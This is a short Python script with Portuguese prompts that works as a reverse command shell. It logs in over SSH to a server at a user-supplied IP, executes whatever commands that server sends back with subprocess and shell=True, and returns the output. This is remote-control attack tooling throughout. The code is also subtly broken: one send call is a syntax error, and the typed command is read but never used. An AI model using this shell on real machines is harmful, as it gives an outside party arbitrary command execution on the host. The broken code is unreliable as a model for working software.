import paramiko	
import shlex
import subprocess

def comando_ssh(ip, user, passwd, cmd, porta="22"):
	client = paramiko.SSHClient()
	client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	client.connect(ip, port=porta, username=user, password=passwd)

	ssh_session = client.get_transport().open_session()
	if ssh_session.active:
		ssh_session.send(cmd)
		print(ssh_session.recv(1024).decode())
		while True:
			comando = ssh_session.recv(1024)
			try:
				cmd = comando.decode()
				if cmd == 'exit':
					client.close()
					break
				cmd_output = subprocess.check_output(shlex.split(cmd), shell=True)
				ssh_session.send(cmd_output, or 'okay')

			except Exception as e:
				ssh_session.send(str(e))
		client.close()
	return

if __name__ == '__main__':
	import getpass
	user = getpass.getuser()
	password = getpass.getpass()

	ip = input('Digite o IP do servidor: ')
	port = input('Digite a porta (22 default): ')
	cmd = input('DIgite o comando: ')
	
	if port != "":
		comando_ssh(ip, user, password, 'ClientConnected', port)
	else:
		comando_ssh(ip, user, password, 'ClientConnected')